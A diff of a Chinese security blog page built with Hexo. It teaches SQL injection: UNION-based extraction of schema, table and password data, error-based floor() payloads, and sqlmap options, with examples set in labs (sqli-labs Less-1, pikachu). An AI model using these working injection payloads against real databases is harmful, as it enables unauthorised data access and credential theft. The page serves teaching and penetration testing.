@@ -29,6 +29,8 @@
 </script>
 
 
+
+
 	<meta name="generator" content="Hexo 6.1.0"></head>
 
 	<body>
@@ -277,9 +279,9 @@
 </div>
 <div class="article-content">
     <div id="article" class="content">
-        <h1 id="SQL注入介绍"><a href="#SQL注入介绍" class="headerlink" title="SQL注入介绍"></a>SQL注入介绍</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>SQL注入是比较常见的网络攻击方式之一，它不是利用操作系统的BUG来实现攻击，而是针对程序员编写时的疏忽，通过SQL语句，实现无账号登录，甚至篡改数据库。</p>
+        <h1><span id="sql注入介绍">SQL注入介绍</span></h1><h3><span id="前言">前言</span></h3><p>SQL注入是比较常见的网络攻击方式之一，它不是利用操作系统的BUG来实现攻击，而是针对程序员编写时的疏忽，通过SQL语句，实现无账号登录，甚至篡改数据库。</p>
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/1.png" alt="1"></p>
-<h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><p><strong>从注入手法分类可以分为：</strong></p>
+<h3><span id="sql注入的分类">SQL注入的分类</span></h3><p><strong>从注入手法分类可以分为：</strong></p>
 <blockquote>
 <p><strong>联合查询注入</strong></p>
 <p><strong>报错型注入</strong></p>
@@ -307,7 +309,7 @@
 <p><strong>HTTP头部（提交数据方式为HTTP头部）</strong></p>
 <p><strong>cookie数据（提交数据方式为cookie）</strong></p>
 </blockquote>
-<h3 id="SQL注入的危害"><a href="#SQL注入的危害" class="headerlink" title="SQL注入的危害"></a>SQL注入的危害</h3><p>分为两类：危害数据库里的数据、直接危害到网站的权限(需要满足条件)</p>
+<h3><span id="sql注入的危害">SQL注入的危害</span></h3><p>分为两类：危害数据库里的数据、直接危害到网站的权限(需要满足条件)</p>
 <ol>
 <li><p>数据库信息泄露</p>
 </li>
@@ -320,12 +322,12 @@
 <li><p>读写文件获取webshell</p>
 </li>
 </ol>
-<h3 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h3><p>  SQL注入漏洞的产生需要满足以下两个条件：</p>
+<h3><span id="sql注入原理">SQL注入原理</span></h3><p>  SQL注入漏洞的产生需要满足以下两个条件：</p>
 <ul>
 <li>参数用户可控：前端传给后端的参数内容是用户可以控制的。</li>
 <li>参数参与数据库操作：传入的参数直接拼接到SQL语句后，带入数据库进行相关操作。</li>
 </ul>
-<h3 id="SQL注入步骤"><a href="#SQL注入步骤" class="headerlink" title="SQL注入步骤"></a>SQL注入步骤</h3><p><strong>1.注入点判断</strong>。</p>
+<h3><span id="sql注入步骤">SQL注入步骤</span></h3><p><strong>1.注入点判断</strong>。</p>
 <p>​        不同类别的网站注入点存在的位置也可能不一样，但其都有脱离不了一点就是与数据库进行交互，所以与数据库发生交互操作的功能点都有可能存在SQL注入，常出现注入点的位置有：新闻公告等查询处、用户注册处、用户登录处等等。</p>
 <p><strong>2.判断SQL语句中的列数</strong>。</p>
 <pre><code>   注入点正常实现的数据往往不是我们想要得到的数据，通常我们需要使用`union`或报错等操作，使得此注入点显示的数据是我们想要得到的，但构造我们需要的查询时必须要知道原SQL语句中的列数，否则SQL执行时会发生错误。
@@ -340,27 +342,27 @@
 <p>​        在拿到数据库表名信息后，需要继续爆破表中的字段值，以判断哪些字段是我们想要得到的。</p>
 <p><strong>7.构造SQL语句爆字段值</strong>。</p>
 <p>​        爆破的最终目的就是爆表中的字段值，再得到表名、字段名后就需要尝试爆我们想要得到的数据</p>
-<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p><strong>判断注入点</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">and 1=1 页面正常</span><br><span class="line">and 1=2 页面错误</span><br><span class="line"></span><br><span class="line">SELECT * FROM user WHERE id=1 and 1=1 LIMIT 0,1 正常</span><br><span class="line">SELECT * FROM user WHERE id=1 and 1=2 LIMIT 0,1 错误</span><br><span class="line"></span><br><span class="line">(有一个正常，整个语句都为真)</span><br><span class="line">SELECT * FROM user WHERE id=1 or 1=1 LIMIT 0,1 正常</span><br><span class="line">SELECT * FROM user WHERE id=1 or 1=2 LIMIT 0,1 正常</span><br></pre></td></tr></table></figure>
+<h3><span id="判断注入点">判断注入点</span></h3><p><strong>判断注入点</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and 1=1 页面正常<br>and 1=2 页面错误<br><br>SELECT * FROM user WHERE id=1 and 1=1 LIMIT 0,1 正常<br>SELECT * FROM user WHERE id=1 and 1=2 LIMIT 0,1 错误<br><br>(有一个正常，整个语句都为真)<br>SELECT * FROM user WHERE id=1 or 1=1 LIMIT 0,1 正常<br>SELECT * FROM user WHERE id=1 or 1=2 LIMIT 0,1 正常<br></code></pre></td></tr></table></figure>
 
 <p><strong>判断字段数</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 1,2,3,4</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">order by 1,2,3,4<br></code></pre></td></tr></table></figure>
 
 
 
 <p><strong>常用的SQL数据库函数</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. version()——MySQL 版本</span><br><span class="line">2. user()——数据库用户名</span><br><span class="line">3. database()——数据库名</span><br><span class="line">4. @@datadir——数据库路径</span><br><span class="line">5. @@version_compile_os——操作系统版本</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1. version()——MySQL 版本<br>2. user()——数据库用户名<br>3. database()——数据库名<br>4. @@datadir——数据库路径<br>5. @@version_compile_os——操作系统版本<br></code></pre></td></tr></table></figure>
 
 
 
-<h1 id="判断SQL数据库类型"><a href="#判断SQL数据库类型" class="headerlink" title="判断SQL数据库类型"></a>判断SQL数据库类型</h1><p><strong>前端与数据库类型</strong><br>asp：SQL Server，Access<br>.net：SQL Server<br>php：MySQL，PostgreSQL<br>java：Oracle，MySQL</p>
+<h1><span id="判断sql数据库类型">判断SQL数据库类型</span></h1><p><strong>前端与数据库类型</strong><br>asp：SQL Server，Access<br>.net：SQL Server<br>php：MySQL，PostgreSQL<br>java：Oracle，MySQL</p>
 <p><strong>根据端口判断</strong><br>Oracle：默认端口1521<br>SQL Server：默认端口1433<br>MySQL：默认端口3306</p>
 <p><strong>根据数据库特有函数来判断</strong><br>len和length<br>len()：SQL Server 、MySQL以及db2返回长度的函数。<br>length()：Oracle和INFORMIX返回长度的函数。</p>
 <p><strong>version和@@version</strong><br>version()：MySQL查询版本信息的函数<br>@@version：MySQL和SQL Server查询版本信息的函数</p>
 <p><strong>substring和substr</strong><br>MySQL两个函数都可以使用<br>Oracle只可调用substr<br>SQL Server只可调用substring</p>
 <p><strong>根据特殊符号进行判断</strong><br><strong>&#x2F;</strong>*  是MySQL数据库的注释符<br><strong>–</strong>  是Oracle和SQL Server支持的注释符<br><strong>; ** 是子句查询标识符，Oracle不支持多行查询，若返回错误，则说明可能是Oracle数据库<br><strong>#</strong>  是MySQL中的注释符，返回错误则说明可能不是MySQL，另外也支持– 和&#x2F;</strong>&#x2F;</p>
-<h1 id="SQL注入利用"><a href="#SQL注入利用" class="headerlink" title="SQL注入利用"></a>SQL注入利用</h1><p> <img src="/../../images/SQL%E6%B3%A8%E5%85%A5/MYSQL%E6%B3%A8%E5%85%A5.png" alt="img"> </p>
-<h3 id="UNION注入"><a href="#UNION注入" class="headerlink" title="UNION注入"></a>UNION注入</h3><p> <code>union</code>操作符用于合并两个或多个SQL语句，得到<strong>联合查询结果</strong> </p>
+<h1><span id="sql注入利用">SQL注入利用</span></h1><p> <img src="/../../images/SQL%E6%B3%A8%E5%85%A5/MYSQL%E6%B3%A8%E5%85%A5.png" alt="img"> </p>
+<h3><span id="union注入">UNION注入</span></h3><p> <code>union</code>操作符用于合并两个或多个SQL语句，得到<strong>联合查询结果</strong> </p>
 <ol>
 <li><p><strong>利用order判断字段数</strong></p>
 <p>order by x(数字） 正常与错误的正常值  正确网页正常显示，错误网页报错</p>
@@ -382,7 +384,7 @@
 <p>?id&#x3D;-1’ union select 1,2,group_concat(已知字段名,’:’已知字段名) from 已知表名–+</p>
 </li>
 </ol>
-<h3 id="高权限注入"><a href="#高权限注入" class="headerlink" title="高权限注入"></a>高权限注入</h3><p>​        MYSQL注入中首先要明确当前注入点权限，高权限注入时有更多的攻击手法，有的能直接进行getshell操作。其中也会遇到很多阻碍，相关防御方案也要明确，所谓知己知彼,百战不殆。不论作为攻击还是防御都需要了解其中的手法和原理，这样才是一个合格的安全工作者。</p>
+<h3><span id="高权限注入">高权限注入</span></h3><p>​        MYSQL注入中首先要明确当前注入点权限，高权限注入时有更多的攻击手法，有的能直接进行getshell操作。其中也会遇到很多阻碍，相关防御方案也要明确，所谓知己知彼,百战不殆。不论作为攻击还是防御都需要了解其中的手法和原理，这样才是一个合格的安全工作者。</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2021/png/1272951/1621404478267-41dfa830-312e-42bf-a4b3-366e08be8d2c.png?x-oss-process=image/resize,w_1102/resize,w_928,limit_0" alt="img"> </p>
 <p><strong>MySQL 5.x数据结构</strong></p>
 <ol>
@@ -397,32 +399,32 @@
 <li><p>获取所有数据库名</p>
 </li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(schema_name),3 from information_schema.schemata</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">union select 1,group_concat(schema_name),3 from information_schema.schemata<br><br></code></pre></td></tr></table></figure>
 
 <ol start="2">
 <li>获取指定数据库下的表名</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;pikachu&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;pikachu&#x27;<br></code></pre></td></tr></table></figure>
 
 <ol start="3">
 <li>获取指定数据库指定表名下的列名信息</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(column_name),3 from information_schema.columns where  table_name=&#x27;users&#x27; and table_schema=&#x27;pikachu&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">union select 1,group_concat(column_name),3 from information_schema.columns where  table_name=&#x27;users&#x27; and table_schema=&#x27;pikachu&#x27;<br></code></pre></td></tr></table></figure>
 
 <ol start="4">
 <li>获取指定列下的字段信息</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,username,password from users  LIMIT 1,1 --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">union select 1,username,password from users  LIMIT 1,1 --+<br></code></pre></td></tr></table></figure>
 
 
 
 
 
-<h1 id="WEB漏洞—类型及提交注入"><a href="#WEB漏洞—类型及提交注入" class="headerlink" title="WEB漏洞—类型及提交注入"></a>WEB漏洞—类型及提交注入</h1><pre><code>     在真实 SQL 注入安全测试中，我们一定要先明确提交数据及提交方 法后再进行注入，其中提交数据类型和提交方法可以通过抓包分析获取， 后续安全测试中我们也必须满足同等的操作才能进行注入
+<h1><span id="web漏洞类型及提交注入">WEB漏洞—类型及提交注入</span></h1><pre><code>     在真实 SQL 注入安全测试中，我们一定要先明确提交数据及提交方 法后再进行注入，其中提交数据类型和提交方法可以通过抓包分析获取， 后续安全测试中我们也必须满足同等的操作才能进行注入
 </code></pre>
-<h3 id="简要明确参数类型"><a href="#简要明确参数类型" class="headerlink" title="简要明确参数类型"></a><strong>简要明确参数类型</strong></h3><p><strong>根据网站上的参数或者值来判定注入的时候是否需要考虑符号的问题</strong></p>
+<h3><span id="简要明确参数类型"><strong>简要明确参数类型</strong></span></h3><p><strong>根据网站上的参数或者值来判定注入的时候是否需要考虑符号的问题</strong></p>
 <p><strong>数字，字符，搜索，JSON 等</strong></p>
-<h3 id="数字-x2F-字符"><a href="#数字-x2F-字符" class="headerlink" title="数字&#x2F;字符"></a><strong>数字&#x2F;字符</strong></h3><p>数字型：基本不用引号，但是也不是绝对的，数字也可以加单引号</p>
+<h3><span id="数字x2f字符"><strong>数字&#x2F;字符</strong></span></h3><p>数字型：基本不用引号，但是也不是绝对的，数字也可以加单引号</p>
 <p>字符型：一般采用单引号，但是不单止单引号 也可以是 ‘,”,%,),}等</p>
 <p><strong>即使有注入也会带入单引号里，产生不了任何作用，所以我们要做的前提是先要把它的符号闭合掉</strong></p>
 <p>select * from user where id &#x3D;1;</p>
@@ -436,9 +438,9 @@
 <p><strong>and  1&#x3D;1原始的意义是应该拼接到SQL语句中形成一个逻辑判断的情况，由于单引号的出现导致语句写到单引号里面成为一个单纯的字符串，没有了任何意义.</strong></p>
 <p><strong>根据网站自身的参数的值来判断在注人的时候是否需要考虑符合的问题。</strong></p>
 <p><img src="D:/my_blog/source/images/sql%25E6%25B3%25A8%25E5%2585%25A5/9.png" alt="9"></p>
-<h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a><strong>搜索</strong></h3><p>​        <strong>将数据进行搜索并进行展示，搜索符号是%，在过滤的时候要过滤单引号和百分号，不然语句全部在单引号和百分号里</strong></p>
+<h3><span id="搜索"><strong>搜索</strong></span></h3><p>​        <strong>将数据进行搜索并进行展示，搜索符号是%，在过滤的时候要过滤单引号和百分号，不然语句全部在单引号和百分号里</strong></p>
 <p>select * from user where name like ‘%xiaojun%’ </p>
-<h3 id="简要明确请求方法"><a href="#简要明确请求方法" class="headerlink" title="简要明确请求方法"></a><strong>简要明确请求方法</strong></h3><ul>
+<h3><span id="简要明确请求方法"><strong>简要明确请求方法</strong></span></h3><ul>
 <li><p><strong>GET,POST,COOKIE,REQUEST,HTTP</strong> 头等</p>
 </li>
 <li><p><strong>请求方法可以通过浏览器开发者模式查看数据包的前缀</strong></p>
@@ -449,10 +451,10 @@
 <li><strong>一般情况下，大数据采用POST上传方式</strong></li>
 </ul>
 <p><strong>不同的请求方法，请求数据，类型，大小，都不一样</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET产生一个TCP数据包；POST产生两个TCP数据包。</span><br><span class="line">         对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；</span><br><span class="line">          而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。</span><br><span class="line">      	 GET方法无法接收POST的值</span><br><span class="line">   在POST情况下GET的值只要在网址后面就能接收</span><br><span class="line">   GET、POST接收单个</span><br><span class="line">   REQUEST 全部接收，网站在访问的时候由于我们大多数是黑盒测试，不知道对方代码写法，如果对方采用REQUEST接收方式，就不需要考虑用何种方法去提交，因为用GET、POST都可以。如果对方是单一接收方式，那么在注入的时候需要用它的方法去注入。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">GET产生一个TCP数据包；POST产生两个TCP数据包。<br>         对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；<br>          而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。<br>      	 GET方法无法接收POST的值<br>   在POST情况下GET的值只要在网址后面就能接收<br>   GET、POST接收单个<br>   REQUEST 全部接收，网站在访问的时候由于我们大多数是黑盒测试，不知道对方代码写法，如果对方采用REQUEST接收方式，就不需要考虑用何种方法去提交，因为用GET、POST都可以。如果对方是单一接收方式，那么在注入的时候需要用它的方法去注入。<br></code></pre></td></tr></table></figure>
 
-<h3 id="GET和POST两种基本请求方法和区别："><a href="#GET和POST两种基本请求方法和区别：" class="headerlink" title="GET和POST两种基本请求方法和区别："></a>GET和POST两种基本请求方法和区别：</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/logsharing/p/8448446.html">https://www.cnblogs.com/logsharing/p/8448446.html</a></p>
-<h3 id="干扰符号"><a href="#干扰符号" class="headerlink" title="干扰符号"></a>干扰符号</h3><p> SQL 语句干扰符号：’,”,%,),}等，具体需看写法</p>
+<h3><span id="get和post两种基本请求方法和区别">GET和POST两种基本请求方法和区别：</span></h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/logsharing/p/8448446.html">https://www.cnblogs.com/logsharing/p/8448446.html</a></p>
+<h3><span id="干扰符号">干扰符号</span></h3><p> SQL 语句干扰符号：’,”,%,),}等，具体需看写法</p>
 <p>Less-1为例：</p>
 <ol>
 <li><p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-1/?id=1&#39;">http://127.0.0.1/Less-1/?id=1&#39;</a>  and 1&#x3D;1</p>
@@ -468,7 +470,7 @@
 </ol>
 <p>–+负责把后面的单引号注释掉</p>
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/13.png" alt="13"></p>
-<h3 id="POST注入："><a href="#POST注入：" class="headerlink" title="POST注入："></a><strong>POST注入</strong>：</h3><h3 id="COOKIE注入："><a href="#COOKIE注入：" class="headerlink" title="COOKIE注入："></a>COOKIE注入：</h3><h3 id="HTTP头注入："><a href="#HTTP头注入：" class="headerlink" title="HTTP头注入："></a>HTTP头注入：</h3><h3 id="JSON注入相关知识"><a href="#JSON注入相关知识" class="headerlink" title="JSON注入相关知识"></a>JSON注入相关知识</h3><p>a. 简介</p>
+<h3><span id="post注入"><strong>POST注入</strong>：</span></h3><h3><span id="cookie注入">COOKIE注入：</span></h3><h3><span id="http头注入">HTTP头注入：</span></h3><h3><span id="json注入相关知识">JSON注入相关知识</span></h3><p>a. 简介</p>
 <p>JSON 是存储和交换文本信息的语法，是轻量级的文本数据交换格式。类似xml，但JSON 比 XML 更小、更快，更易解析。所以现在接口数据传输都采用json方式进行。JSON 文本的 MIME 类型是 “application&#x2F;json”</p>
 <p> JSON语法</p>
 <p>■数据在名称&#x2F;值对中</p>
@@ -483,11 +485,11 @@
 <p>■对象（在大括号中）JSON 对象在大括号（{}）中书写：</p>
 <p>■null  { “runoob”:null }</p>
 <p>d. JSON代码格式</p>
-<h3 id="SQLMap简单使用"><a href="#SQLMap简单使用" class="headerlink" title="SQLMap简单使用"></a>SQLMap简单使用</h3><p>● –is-dba 当前用户权限（是否为root权限）<br>● –dbs 所有数据库<br>● –current-db 网站当前数据库<br>● –users 所有数据库用户<br>● –current-user 当前数据库用户<br>● –random-agent 构造随机user-agent<br>● –passwords 数据库密码<br>● –proxy <a target="_blank" rel="noopener" href="http://local:8080/">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理<br>● –time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</p>
+<h3><span id="sqlmap简单使用">SQLMap简单使用</span></h3><p>● –is-dba 当前用户权限（是否为root权限）<br>● –dbs 所有数据库<br>● –current-db 网站当前数据库<br>● –users 所有数据库用户<br>● –current-user 当前数据库用户<br>● –random-agent 构造随机user-agent<br>● –passwords 数据库密码<br>● –proxy <a target="_blank" rel="noopener" href="http://local:8080/">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理<br>● –time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</p>
 <p><strong>常用方法：</strong></p>
 <p><img src="D:/my_blog/source/images/sql%25E6%25B3%25A8%25E5%2585%25A5/14.png" alt="14"></p>
 <p><strong>详细SQLMap使用：</strong></p>
-<h1 id="WEB漏洞—查询方式及盲注"><a href="#WEB漏洞—查询方式及盲注" class="headerlink" title="WEB漏洞—查询方式及盲注"></a>WEB漏洞—查询方式及盲注</h1><p><strong>前言</strong></p>
+<h1><span id="web漏洞查询方式及盲注">WEB漏洞—查询方式及盲注</span></h1><p><strong>前言</strong></p>
 <p>​            当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大概写法也能更好的选择对应的注入语句</p>
 <p><strong>涉及知识点：</strong></p>
 <ul>
@@ -498,26 +500,26 @@
 <li><p><strong>布尔盲注</strong></p>
 </li>
 </ul>
-<h3 id="ASCCI码表"><a href="#ASCCI码表" class="headerlink" title="ASCCI码表"></a>ASCCI码表</h3><p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/ascci.png" alt="1646537964629"></p>
+<h3><span id="ascci码表">ASCCI码表</span></h3><p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/ascci.png" alt="1646537964629"></p>
 <p><strong>SQL语句</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select 查询数据</span><br><span class="line">在网站应用中进行数据显示查询效果</span><br><span class="line">例： select * from news wher id=$id</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs sqlite">select 查询数据<br>在网站应用中进行数据显示查询效果<br>例： select * from news wher id=$id<br></code></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">insert 插入数据</span><br><span class="line"></span><br><span class="line">在网站应用中进行用户注册添加等操作</span><br><span class="line">例：insert into news(id,url,text) values(2,&#x27;x&#x27;,&#x27;$t&#x27;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mssql">insert 插入数据<br><br>在网站应用中进行用户注册添加等操作<br>例：insert into news(id,url,text) values(2,&#x27;x&#x27;,&#x27;$t&#x27;)<br></code></pre></td></tr></table></figure>
 
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> 删除数据</span><br><span class="line"></span><br><span class="line">后台管理里面删除文章删除用户等操作</span><br><span class="line">例：<span class="keyword">delete</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span>$id</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">delete</span> 删除数据<br><br>后台管理里面删除文章删除用户等操作<br>例：<span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>$id<br></code></pre></td></tr></table></figure>
 
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> 更新数据</span><br><span class="line"></span><br><span class="line">会员或后台中心数据同步或缓存等操作</span><br><span class="line">例：<span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> pwd<span class="operator">=</span><span class="string">&#x27;$p&#x27;</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> 更新数据<br><br>会员或后台中心数据同步或缓存等操作<br>例：<span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> pwd<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$p&#x27;</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">and</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure>
 
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> 排列数据</span><br><span class="line"></span><br><span class="line">一般结合表名或列名进行数据排序操作</span><br><span class="line">例：<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">order</span> <span class="keyword">by</span> $id</span><br><span class="line">例：<span class="keyword">select</span> id,name,price <span class="keyword">from</span> news <span class="keyword">order</span> <span class="keyword">by</span> $<span class="keyword">order</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> 排列数据<br><br>一般结合表名或列名进行数据排序操作<br>例：<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> $id<br>例：<span class="hljs-keyword">select</span> id,name,price <span class="hljs-keyword">from</span> news <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> $<span class="hljs-keyword">order</span><br></code></pre></td></tr></table></figure>
 
 
 
-<h3 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h3><p>发现注入漏洞时，构造sql语句不回显类容，但是会打印报错语句</p>
+<h3><span id="报错盲注">报错盲注</span></h3><p>发现注入漏洞时，构造sql语句不回显类容，但是会打印报错语句</p>
 <p>目的：让错误信息返回数据库中的类容</p>
 <p>原理分析：</p>
 <ul>
 <li><p><strong>floor()</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">首先我们探讨一下是什么导致了报错，真是floor（）这个函数吗？</span><br><span class="line">floor这个函数，它的作用是返回参数的最小整数。也就是向下取整（2.2 ==》）。很显然这个函数不可能导致报错。再者count（*）就是一个计数的函数，也不是。其实真正发生作用的是第二层括号里面的代码</span><br><span class="line"></span><br><span class="line">select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x</span><br><span class="line"></span><br><span class="line">Mysql在执行 select count() from XXX group by x这一类语句时会先创建一个虚拟表，然后在虚拟表中插入数据，key是主键，不可重复。记住，不可重复，这个是重点。key就是后面那个x</span><br><span class="line">假设我们现在有这样一个表</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">首先我们探讨一下是什么导致了报错，真是floor（）这个函数吗？<br>floor这个函数，它的作用是返回参数的最小整数。也就是向下取整（2.2 ==》）。很显然这个函数不可能导致报错。再者count（*）就是一个计数的函数，也不是。其实真正发生作用的是第二层括号里面的代码<br><br>select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x<br><br>Mysql在执行 select count() from XXX group by x这一类语句时会先创建一个虚拟表，然后在虚拟表中插入数据，key是主键，不可重复。记住，不可重复，这个是重点。key就是后面那个x<br>假设我们现在有这样一个表<br></code></pre></td></tr></table></figure>
 
 <p>使用 group by 对一些rand()函数进行操作时会返回重复键</p>
 <p>（duplicate key）错误</p>
@@ -542,25 +544,25 @@
 <ol>
 <li>获取数据库名</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 from(select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and(select 1 from(select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>
 
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/5.png" alt="1646480666891"></p>
 <ol start="2">
 <li>爆表名</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>
 
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/6..png" alt="1646480854172"></p>
 <ol start="3">
 <li>爆字段</li>
 </ol>
